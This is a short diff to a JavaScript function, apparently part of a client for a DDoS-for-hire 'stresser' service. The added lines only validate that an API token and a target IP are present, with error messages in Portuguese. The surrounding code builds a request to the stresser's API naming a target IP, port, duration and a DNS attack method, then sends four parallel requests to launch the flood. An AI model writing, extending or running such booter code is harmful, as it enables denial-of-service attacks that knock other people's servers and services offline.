@@ -54,6 +54,16 @@ async function clear() {
 }
 
 async function sendApiRequest(ip) {
+    if (!token || token.trim() === '') {
+        console.error('Token inválido. Por favor, forneça um token válido.');
+        return; // Para a execução da função
+    }
+
+    if (!ip || ip.trim() === '') {
+        console.error('IP inválido. Por favor, forneça um IP válido.');
+        return; // Para a execução da função
+    }
+    
     const url = `https://api.vacstresser.ru/api?key=${token}&ip=${ip}&port=80&time=30&method=DNS`;
     const requests = Array(4).fill(url).map(u => axios.get(u));
     
